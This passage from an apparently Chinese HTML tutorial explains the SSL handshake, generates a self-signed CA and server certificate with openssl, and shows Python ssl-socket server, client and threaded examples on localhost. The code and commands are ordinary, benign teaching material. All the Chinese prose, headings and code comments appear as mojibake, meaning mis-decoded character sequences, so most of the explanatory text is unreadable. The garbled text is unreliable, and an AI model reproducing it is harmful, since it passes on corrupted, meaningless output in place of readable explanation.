·å°±ä¸å¤ªå®¹æ˜“è¢«çªƒå¬çš„äººçœ‹æ˜ç™½ï¼ˆå³ä¸­é—´äººæ”»å‡»ï¼‰ã€‚</p></li></ul><p>æ‰€ä»¥SSLç­‰äºè§£å†³äº†ä¸¤ä¸ªé—®é¢˜ï¼Œ1 æµé‡åŠ«æŒ 2 ä¸­é—´äººæ”»å‡»ã€‚</p><p><strong>SSLåè®®é€šä¿¡çš„æ¡æ‰‹æ­¥éª¤</strong>å¦‚ä¸‹ï¼š</p><ul><li><p>ç¬¬1æ­¥ï¼ŒSSLå®¢æˆ·æœºè¿æ¥è‡³SSLæœåŠ¡å™¨ï¼Œå¹¶è¦æ±‚æœåŠ¡å™¨éªŒè¯å®ƒè‡ªèº«çš„èº«ä»½ï¼›</p></li><li><p>ç¬¬2æ­¥ï¼ŒæœåŠ¡å™¨é€šè¿‡å‘é€å®ƒçš„æ•°å­—è¯ä¹¦è¯æ˜å…¶èº«ä»½ã€‚è¿™ä¸ªäº¤æ¢è¿˜å¯ä»¥åŒ…æ‹¬æ•´ä¸ªè¯ä¹¦é“¾ï¼Œç›´åˆ°æŸä¸ªæ ¹è¯ä¹¦é¢å‘æœºæ„ï¼ˆCAï¼‰ã€‚é€šè¿‡æ£€æŸ¥æœ‰æ•ˆæ—¥æœŸå¹¶ç¡®è®¤è¯ä¹¦åŒ…å«å¯ä¿¡ä»»CAçš„æ•°å­—ç­¾åæ¥éªŒè¯è¯ä¹¦çš„æœ‰æ•ˆæ€§ã€‚</p></li><li><p>ç¬¬3æ­¥ï¼ŒæœåŠ¡å™¨å‘å‡ºä¸€ä¸ªè¯·æ±‚ï¼Œå¯¹å®¢æˆ·ç«¯çš„è¯ä¹¦è¿›è¡ŒéªŒè¯ï¼Œä½†æ˜¯ç”±äºç¼ºä¹å…¬é’¥ä½“ç³»ç»“æ„ï¼Œå½“ä»Šçš„å¤§å¤šæ•°æœåŠ¡å™¨ä¸è¿›è¡Œå®¢æˆ·ç«¯è®¤è¯ã€‚</p></li><li><p>ç¬¬4æ­¥ï¼Œåå•†ç”¨äºåŠ å¯†çš„æ¶ˆæ¯åŠ å¯†ç®—æ³•å’Œç”¨äºå®Œæ•´æ€§æ£€æŸ¥çš„å“ˆå¸Œå‡½æ•°ï¼Œé€šå¸¸ç”±å®¢æˆ·ç«¯æä¾›å®ƒæ”¯æŒçš„æ‰€æœ‰ç®—æ³•åˆ—è¡¨ï¼Œç„¶åç”±æœåŠ¡å™¨é€‰æ‹©æœ€å¼ºå¤§çš„åŠ å¯†ç®—æ³•ã€‚</p></li><li><p>ç¬¬5æ­¥ï¼Œå®¢æˆ·æœºå’ŒæœåŠ¡å™¨é€šè¿‡ä»¥ä¸‹æ­¥éª¤ç”Ÿæˆä¼šè¯å¯†é’¥ï¼š</p><ul><li>å®¢æˆ·æœºç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œå¹¶ä½¿ç”¨æœåŠ¡å™¨çš„å…¬é’¥ï¼ˆä»æœåŠ¡å™¨è¯ä¹¦ä¸­è·å–ï¼‰å¯¹å®ƒåŠ å¯†ï¼Œä»¥é€åˆ°æœåŠ¡å™¨ä¸Šã€‚</li><li>æœåŠ¡å™¨ç”¨æ›´åŠ éšæœºçš„æ•°æ®ï¼ˆå®¢æˆ·æœºçš„å¯†é’¥å¯ç”¨æ—¶åˆ™ä½¿ç”¨å®¢æˆ·æœºå¯†é’¥ï¼Œå¦åˆ™ä»¥æ˜æ–‡æ–¹å¼å‘é€æ•°æ®ï¼‰å“åº”ã€‚</li></ul></li></ul><h2 id="sslé€šä¿¡å®ç°"><a class="markdownIt-Anchor" href="#sslé€šä¿¡å®ç°"></a> SSLé€šä¿¡å®ç°</h2><h3 id="è¯ä¹¦ç”Ÿæˆ"><a class="markdownIt-Anchor" href="#è¯ä¹¦ç”Ÿæˆ"></a> è¯ä¹¦ç”Ÿæˆ</h3><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal"># 1.å…ˆåˆ›å»º CA ç§é’¥ï¼Œè¿™ä¸ªæ˜¯ç”¨æ¥ç”Ÿæˆca.crtç”¨çš„<br>openssl genrsa -out ca.key 2048<br><br># 2.ç„¶åç”Ÿæˆè‡ªç­¾åCAè¯ä¹¦ï¼Œè¿™ä¸ªæ‰æ˜¯æˆ‘ä»¬è¦ç”¨çš„ä¸œè¥¿ã€‚<br># req X.509è¯ä¹¦ç­¾å‘è¯·æ±‚(CSR)ç®¡ç†<br># -new æ–°çš„è¯·æ±‚<br>#  -x509 è¾“å‡ºä¸€ä¸ªX509æ ¼å¼çš„è¯ä¹¦ <br>#  -days X509è¯ä¹¦çš„æœ‰æ•ˆæ—¶é—´  <br>#  -key ç”¨äºç­¾åå¾…ç”Ÿæˆçš„è¯·æ±‚è¯ä¹¦çš„ç§é’¥æ–‡ä»¶<br>#  -subj å‚æ•°æŒ‡å®šè¯ä¹¦ä¿¡æ¯ï¼Œé¿å…åœ¨ç»ˆç«¯é€ä¸ªè¾“å…¥<br>openssl req -new -x509 -days 3650 -key ca.key -out ca.crt -subj &quot;/C=CN/ST=hunan/L=changsha/O=HNU/OU=csee/CN=CA_zino&quot;<br><br># 3.ç”ŸæˆæœåŠ¡å™¨ç§é’¥ã€‚æ³¨æ„è¿™ä¸ªè·Ÿåˆšæ‰é‚£ä¸ªCAä¸æ˜¯ä¸€å›äº‹äº†ï¼Œç›¸å½“äºå®é™…ä¸šåŠ¡ä¸­çš„éœ€è¦è¢«è®¤è¯çš„ç½‘ç«™ã€‚<br>openssl genrsa -out server.key 2048<br><br># 4.ç”Ÿæˆè¦é¢å‘è¯ä¹¦çš„è¯ä¹¦ç­¾åè¯·æ±‚<br>openssl req -new -key server.key -out server.csr -subj &quot;/C=CN/ST=hunan/L=changsha/O=HNU/OU=csee/CN=127.0.0.1&quot;<br><br># 5.ç”¨åˆšæ‰ç¬¬2æ­¥åˆ›å»ºçš„ CA è¯ä¹¦ç»™ç¬¬4æ­¥ç”Ÿæˆçš„ ç­¾åè¯·æ±‚ è¿›è¡Œç­¾åï¼Œè¡¨æ˜è¯¥è¯ä¹¦è¯·æ±‚å·²è¢«CAä¿¡ä»»ï¼Œå¾—åˆ°ä¸€ä¸ªè¢«CAç­¾åè¿‡çš„è¯ä¹¦ã€‚<br># x509 è¯ä¹¦å¤„ç†å·¥å…·ã€‚å¯ä»¥ç”¨æ¥æ˜¾ç¤ºè¯ä¹¦çš„å†…å®¹ï¼Œè½¬æ¢å…¶æ ¼å¼ï¼Œç»™CSRç­¾åç­‰X.509è¯ä¹¦çš„ç®¡ç†å·¥ä½œ<br># -req è¡¨æ˜è¾“å…¥æ–‡ä»¶æ˜¯ä¸€ä¸ª&quot;è¯·æ±‚ç­¾å‘è¯ä¹¦æ–‡ä»¶(CSR)&quot;ï¼Œç­‰å¾…è¿›è¡Œç­¾å‘<br>#-CA arg æŒ‡å®šç”¨äºç­¾å‘è¯·æ±‚è¯ä¹¦çš„æ ¹CAè¯ä¹¦ <br>#-CAkey arg æŒ‡å®šç”¨äºç­¾å‘è¯·æ±‚è¯ä¹¦çš„CAç§é’¥è¯ä¹¦æ–‡ä»¶ï¼Œå¦‚æœè¿™ä¸ªoptionæ²¡æœ‰å‚æ•°è¾“å…¥ï¼Œé‚£ä¹ˆç¼ºçœè®¤ä¸ºç§æœ‰å¯†é’¥åœ¨CAè¯ä¹¦æ–‡ä»¶é‡Œæœ‰<br>openssl x509 -req  -days 3650 -in server.csr -CA ca.crt -CAkey ca.key -set_serial 01 -out server.crt<br><br># ä¹‹åå°±æ˜¯å®¢æˆ·ç«¯ç”¨CAè¯ä¹¦æ¥å¯¹æœåŠ¡ç«¯è¢«CAç­¾åè¿‡çš„è¯ä¹¦æ¥è¿›è¡Œè®¤è¯<br>openssl  verify  -CAfile  ca.crt  server.crt<br><br># æŸ¥çœ‹è¯ä¹¦å…·ä½“ä¿¡æ¯<br>openssl x509 -in server.crt -noout -text<br></code></pre></div></td></tr></table></figure><p><img src="/posts/cf547d62/image-20211230085302781.png" alt="image-20211230085302781"></p><p>ç”¨CAéªŒè¯æœåŠ¡ç«¯è¯ä¹¦æ˜¯å¦å¯ä¿¡</p><p><img src="/posts/cf547d62/image-20211230092704065.png" alt="image-20211230092704065"></p><h3 id="æœåŠ¡ç«¯å®ç°"><a class="markdownIt-Anchor" href="#æœåŠ¡ç«¯å®ç°"></a> æœåŠ¡ç«¯å®ç°</h3><p>sslç±»å…·ä½“å‡½æ•°å®šä¹‰å’Œå‚æ•°å«ä¹‰å¯å‚è€ƒ<a href="https://docs.python.org/zh-cn/3/library/ssl.html#module-ssl">å®˜æ–¹æ–‡æ¡£</a></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> ssl<br>ip_port = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-comment"># åˆ›å»ºäº†ä¸€ä¸ª SSLä¸Šä¸‹æ–‡,ssl.PROTOCOL_TLSè¡¨ç¤ºé€‰æ‹©å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å‡æ”¯æŒçš„æœ€é«˜åè®®ç‰ˆæœ¬</span><br>context = ssl.SSLContext(ssl.PROTOCOL_TLS)<br><span class="hljs-comment"># åŠ è½½ä¸€ä¸ªç§é’¥åŠå¯¹åº”çš„è¯ä¹¦</span><br>context.load_cert_chain(certfile=<span class="hljs-string">&quot;server.crt&quot;</span>, keyfile=<span class="hljs-string">&quot;server.key&quot;</span>)<br><br>sk = socket.socket()            <span class="hljs-comment"># åˆ›å»ºå¥—æ¥å­—</span><br>sk.bind(ip_port)                <span class="hljs-comment"># ç»‘å®šæœåŠ¡åœ°å€</span><br>sk.listen(<span class="hljs-number">5</span>)                    <span class="hljs-comment"># ç›‘å¬è¿æ¥è¯·æ±‚</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;å¯åŠ¨socketæœåŠ¡ï¼Œç­‰å¾…å®¢æˆ·ç«¯è¿æ¥...&#x27;</span>)<br><br>connect_sock, address = sk.accept()     <span class="hljs-comment"># ç­‰å¾…è¿æ¥ï¼Œæ­¤å¤„è‡ªåŠ¨é˜»å¡</span><br><span class="hljs-comment"># åŒ…è£…ä¸€ä¸ªç°æœ‰çš„ Python socket,å¹¶è¿”å›ä¸€ä¸ªssl socket,server_sideä¸ºtrueè¡¨ç¤ºä¸ºæœåŠ¡å™¨è¡Œä¸ºï¼Œé»˜è®¤ä¸ºfalseåˆ™è¡¨ç¤ºå®¢æˆ·ç«¯</span><br>ssl_connect_sock = context.wrap_socket(connect_sock, server_side=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:     <span class="hljs-comment"># ä¸€ä¸ªæ­»å¾ªç¯ï¼Œç›´åˆ°å®¢æˆ·ç«¯å‘é€â€˜exitâ€™çš„ä¿¡å·ï¼Œæ‰å…³é—­è¿æ¥</span><br>    client_data = ssl_connect_sock.recv(<span class="hljs-number">1024</span>).decode()      <span class="hljs-comment"># æ¥æ”¶ä¿¡æ¯</span><br>    <span class="hljs-keyword">if</span> client_data == <span class="hljs-string">&quot;exit&quot;</span>:       <span class="hljs-comment"># åˆ¤æ–­æ˜¯å¦é€€å‡ºè¿æ¥</span><br>        sk.close()  <span class="hljs-comment"># å…³é—­è¿æ¥</span><br>        exit(<span class="hljs-string">&quot;é€šä¿¡ç»“æŸ&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ¥è‡ª%sçš„å®¢æˆ·ç«¯å‘ä½ å‘æ¥ä¿¡æ¯ï¼š%s&quot;</span> % (address, client_data))<br>    ssl_connect_sock.sendall(<span class="hljs-string">&#x27;æœåŠ¡å™¨å·²ç»æ”¶åˆ°ä½ çš„ä¿¡æ¯&#x27;</span>.encode())    <span class="hljs-comment"># å›é¦ˆä¿¡æ¯ç»™å®¢æˆ·ç«¯</span><br></code></pre></div></td></tr></table></figure><h3 id="å®¢æˆ·ç«¯å®ç°"><a class="markdownIt-Anchor" href="#å®¢æˆ·ç«¯å®ç°"></a> å®¢æˆ·ç«¯å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> ssl<br><span class="hljs-keyword">import</span> pprint<br><span class="hljs-comment"># åˆ›å»ºäº†ä¸€ä¸ª SSLä¸Šä¸‹æ–‡,ssl.PROTOCOL_TLSè¡¨ç¤ºé€‰æ‹©å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å‡æ”¯æŒçš„æœ€é«˜åè®®ç‰ˆæœ¬</span><br>context = ssl.SSLContext(ssl.PROTOCOL_TLS)<br><span class="hljs-comment"># è®¾ç½®æ¨¡å¼ä¸ºCERT_REQUIREDï¼Œåœ¨æ­¤æ¨¡å¼ä¸‹ï¼Œéœ€è¦ä»å¥—æ¥å­—è¿æ¥çš„å¦ä¸€ç«¯è·å–è¯ä¹¦ï¼›å¦‚æœæœªæä¾›è¯ä¹¦æˆ–éªŒè¯å¤±è´¥åˆ™å°†å¼•å‘ SSLErrorã€‚</span><br>context.verify_mode = ssl.CERT_REQUIRED<br><span class="hljs-comment"># åŠ è½½ä¸€ç»„ç”¨äºéªŒè¯æœåŠ¡å™¨è¯ä¹¦çš„CAè¯ä¹¦</span><br>context.load_verify_locations(<span class="hljs-string">&quot;ca.crt&quot;</span>)<br><span class="hljs-comment"># è®¾ç½®ç«¯å£</span><br>ip_port = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-comment"># åˆ›å»ºå¥—æ¥å­—</span><br>s = socket.socket()<br><span class="hljs-comment"># åŒ…è£…ä¸€ä¸ªç°æœ‰çš„ Python å¥—æ¥å­— sock å¹¶è¿”å›ä¸€ä¸ª SSLContext.sslsocket_class çš„å®ä¾‹ (é»˜è®¤ä¸º SSLSocket)ã€‚</span><br><span class="hljs-comment"># è¿”å›çš„ SSL å¥—æ¥å­—ä¼šç»‘å®šä¸Šä¸‹æ–‡ã€è®¾ç½®ä»¥åŠè¯ä¹¦</span><br>ssl_sock = context.wrap_socket(s, server_hostname=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br><br><span class="hljs-comment"># è¿æ¥æœåŠ¡å™¨</span><br>ssl_sock.connect(ip_port)<br><span class="hljs-comment"># è¾“å‡ºè¯ä¹¦ä¿¡æ¯</span><br>pprint.pprint(ssl_sock.getpeercert())<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:     <span class="hljs-comment"># é€šè¿‡ä¸€ä¸ªæ­»å¾ªç¯ä¸æ–­æ¥æ”¶ç”¨æˆ·è¾“å…¥ï¼Œå¹¶å‘é€ç»™æœåŠ¡å™¨</span><br>    inp = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥è¦å‘é€çš„ä¿¡æ¯ï¼š &quot;</span>).strip()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> inp:     <span class="hljs-comment"># é˜²æ­¢è¾“å…¥ç©ºä¿¡æ¯ï¼Œå¯¼è‡´å¼‚å¸¸é€€å‡º</span><br>        <span class="hljs-keyword">continue</span><br>    ssl_sock.sendall(inp.encode())<br><br>    <span class="hljs-keyword">if</span> inp == <span class="hljs-string">&quot;exit&quot;</span>:   <span class="hljs-comment"># å¦‚æœè¾“å…¥çš„æ˜¯â€˜exitâ€™ï¼Œè¡¨ç¤ºæ–­å¼€è¿æ¥</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç»“æŸé€šä¿¡ï¼&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><br>    server_reply = ssl_sock.recv(<span class="hljs-number">1024</span>).decode()<br>    <span class="hljs-built_in">print</span>(server_reply)<br>s.close()    <span class="hljs-comment"># å…³é—­è¿æ¥</span><br></code></pre></div></td></tr></table></figure><h3 id="åŸºäºçº¿ç¨‹çš„å®ç°"><a class="markdownIt-Anchor" href="#åŸºäºçº¿ç¨‹çš„å®ç°"></a> åŸºäºçº¿ç¨‹çš„å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> ssl<br><span class="hljs-keyword">import</span> pprint<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">client</span>():</span><br>    <span class="hljs-comment"># åˆ›å»ºäº†ä¸€ä¸ª SSLä¸Šä¸‹æ–‡,ssl.PROTOCOL_TLSè¡¨ç¤ºé€‰æ‹©å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å‡æ”¯æŒçš„æœ€é«˜åè®®ç‰ˆæœ¬</span><br>    context = ssl.SSLContext(ssl.PROTOCOL_TLS)<br>    <span class="hljs-comment"># è®¾ç½®æ¨¡å¼ä¸ºCERT_REQUIREDï¼Œåœ¨æ­¤æ¨¡å¼ä¸‹ï¼Œéœ€è¦ä»å¥—æ¥å­—è¿æ¥çš„å¦ä¸€ç«¯è·å–è¯ä¹¦ï¼›å¦‚æœæœªæä¾›è¯ä¹¦æˆ–éªŒè¯å¤±è´¥åˆ™å°†å¼•å‘ SSLErrorã€‚</span><br>    context.verify_mode = ssl.CERT_REQUIRED<br>    <span class="hljs-comment"># åŠ è½½ä¸€ç»„ç”¨äºéªŒè¯å…¶ä»–å¯¹ç­‰æ–¹è¯ä¹¦çš„CAè¯ä¹¦</span><br>    context.load_verify_locations(<span class="hljs-string">&quot;ca.crt&quot;</span>)<br>    <span class="hljs-comment"># è®¾ç½®ç«¯å£</span><br>    ip_port = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br>    <span class="hljs-comment"># åˆ›å»ºå¥—æ¥å­—</span><br>    s = socket.socket()<br>    <span class="hljs-comment"># åŒ…è£…ä¸€ä¸ªç°æœ‰çš„ Python å¥—æ¥å­— sock å¹¶è¿”å›ä¸€ä¸ª SSLContext.sslsocket_class çš„å®ä¾‹ (é»˜è®¤ä¸º SSLSocket)ã€‚</span><br>    <span class="hljs-comment"># è¿”å›çš„ SSL å¥—æ¥å­—ä¼šç»‘å®šä¸Šä¸‹æ–‡ã€è®¾ç½®ä»¥åŠè¯ä¹¦</span><br>    ssl_sock = context.wrap_socket(s, server_hostname=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br><br>    <span class="hljs-comment"># è¿æ¥æœåŠ¡å™¨</span><br>    ssl_sock.connect(ip_port)<br>    <span class="hljs-comment"># è¾“å‡ºè¯ä¹¦ä¿¡æ¯</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;#å®¢æˆ·ç«¯æ¶ˆæ¯#ï¼šå®¢æˆ·ç«¯æˆåŠŸéªŒè¯æœåŠ¡ç«¯è¯ä¹¦ï¼Œå·²æˆåŠŸè¿æ¥ï¼ŒæœåŠ¡ç«¯è¯ä¹¦ä¿¡æ¯å¦‚ä¸‹&#x27;</span>)<br>    pprint.pprint(ssl_sock.getpeercert())<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-comment"># é€šè¿‡ä¸€ä¸ªæ­»å¾ªç¯ä¸æ–­æ¥æ”¶ç”¨æˆ·è¾“å…¥ï¼Œå¹¶å‘é€ç»™æœåŠ¡å™¨</span><br>        inp = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;#å®¢æˆ·ç«¯æ¶ˆæ¯#ï¼šè¯·è¾“å…¥è¦å‘é€çš„ä¿¡æ¯ï¼š &quot;</span>).strip()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> inp:  <span class="hljs-comment"># é˜²æ­¢è¾“å…¥ç©ºä¿¡æ¯ï¼Œå¯¼è‡´å¼‚å¸¸é€€å‡º</span><br>            <span class="hljs-keyword">continue</span><br>        ssl_sock.sendall(inp.encode())<br>        <span class="hljs-keyword">if</span> inp == <span class="hljs-string">&quot;exit&quot;</span>:  <span class="hljs-comment"># å¦‚æœè¾“å…¥çš„æ˜¯â€˜exitâ€™ï¼Œè¡¨ç¤ºæ–­å¼€è¿æ¥</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;#å®¢æˆ·ç«¯æ¶ˆæ¯#ï¼šç»“æŸé€šä¿¡ï¼&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br>        server_reply = ssl_sock.recv(<span class="hljs-number">1024</span>).decode()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;#å®¢æˆ·ç«¯æ¶ˆæ¯#ï¼šæ¥è‡ª%sçš„æœåŠ¡ç«¯å‘ä½ å‘æ¥ä¿¡æ¯ï¼š%s&quot;</span> % (ip_port, server_reply))<br>    s.close()  <span class="hljs-comment"># å…³é—­è¿æ¥</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">server</span>():</span><br>    ip_port = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br>    <span class="hljs-comment"># åˆ›å»ºäº†ä¸€ä¸ª SSLä¸Šä¸‹æ–‡,ssl.PROTOCOL_TLSè¡¨ç¤ºé€‰æ‹©å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å‡æ”¯æŒçš„æœ€é«˜åè®®ç‰ˆæœ¬</span><br>    context = ssl.SSLContext(ssl.PROTOCOL_TLS)<br>    <span class="hljs-comment"># åŠ è½½ä¸€ä¸ªç§é’¥åŠå¯¹åº”çš„è¯ä¹¦</span><br>    context.load_cert_chain(certfile=<span class="hljs-string">&quot;server.crt&quot;</span>, keyfile=<span class="hljs-string">&quot;server.key&quot;</span>)<br><br>    sk = socket.socket()  <span class="hljs-comment"># åˆ›å»ºå¥—æ¥å­—</span><br>    sk.bind(ip_port)  <span class="hljs-comment"># ç»‘å®šæœåŠ¡åœ°å€</span><br>    sk.listen(<span class="hljs-number">5</span>)  <span class="hljs-comment"># ç›‘å¬è¿æ¥è¯·æ±‚</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;#æœåŠ¡ç«¯æ¶ˆæ¯#ï¼šå¯åŠ¨socketæœåŠ¡ï¼Œç­‰å¾…å®¢æˆ·ç«¯è¿æ¥...&#x27;</span>)<br><br>    connect_sock, address = sk.accept()  <span class="hljs-comment"># ç­‰å¾…è¿æ¥ï¼Œæ­¤å¤„è‡ªåŠ¨é˜»å¡</span><br>    <span class="hljs-comment"># åŒ…è£…ä¸€ä¸ªç°æœ‰çš„ Python socket,å¹¶è¿”å›ä¸€ä¸ªssl socket,server_sideä¸ºtrueè¡¨ç¤ºä¸ºæœåŠ¡å™¨è¡Œä¸ºï¼Œé»˜è®¤ä¸ºfalseåˆ™è¡¨ç¤ºå®¢æˆ·ç«¯</span><br>    ssl_connect_sock = context.wrap_socket(connect_sock, server_side=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-comment"># ä¸€ä¸ªæ­»å¾ªç¯ï¼Œç›´åˆ°å®¢æˆ·ç«¯å‘é€â€˜exitâ€™çš„ä¿¡å·ï¼Œæ‰å…³é—­è¿æ¥</span><br>        client_data = ssl_connect_sock.recv(<span class="hljs-number">1024</span>).decode()  <span class="hljs-comment"># æ¥æ”¶ä¿¡æ¯</span><br>        <span class="hljs-comment"># print(client_data)</span><br>        <span class="hljs-keyword">if</span> client_data == <span class="hljs-string">&quot;exit&quot;</span>:  <span class="hljs-comment"># åˆ¤æ–­æ˜¯å¦é€€å‡ºè¿æ¥</span><br>            sk.close()  <span class="hljs-comment"># å…³é—­è¿æ¥</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;#æœåŠ¡ç«¯æ¶ˆæ¯#ï¼šå®¢æˆ·ç«¯å·²ç»“æŸé€šä¿¡ï¼&quot;</span>)<br>            exit(<span class="hljs-string">&quot;é€šä¿¡ç»“æŸ&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;#æœåŠ¡ç«¯æ¶ˆæ¯#ï¼šæ¥è‡ª%sçš„å®¢æˆ·ç«¯å‘ä½ å‘æ¥ä¿¡æ¯ï¼š%s&quot;</span> % (address, client_data))<br>        ssl_connect_sock.sendall(<span class="hljs-string">&#x27;æœåŠ¡å™¨å·²ç»æ”¶åˆ°ä½ çš„ä¿¡æ¯&#x27;</span>.encode())  <span class="hljs-comment"># å›é¦ˆä¿¡æ¯ç»™å®¢æˆ·ç«¯</span><br><br><br>thread_server = threading.Thread(target=server)<br>thread_client = threading.Thread(target=client)<br>thread_server.start()<br>thread_client.start()<br>thread_server.join()<br>thread_client.join()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;é€€å‡ºä¸»çº¿ç¨‹&quot;</span>)<br></code></pre></div></td></tr></table></figure><h3 id="è¿è¡Œç»“æœ"><a class="markdownIt-Anchor" href="#è¿è¡Œç»“æœ"></a> è¿è¡Œç»“æœ</h3><p><img src="/posts/cf547d62/image-20211230093921353.png" alt="image-20211230093921353"></p><p><img src="/posts/cf547d62/image-20211230093900981.png" alt="image-20211230093900981"></p><h1 id="é™„å½•"><a class="markdownIt-Anchor" href="#é™„å½•"></a> é™„å½•</h1><h2 id="åŸºæœ¬æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#åŸºæœ¬æ¦‚å¿µ"></a> åŸºæœ¬æ¦‚å¿µ</h2><h3 id="è¯ä¹¦"><a class="markdownIt-Anchor" href="#è¯ä¹¦"></a> 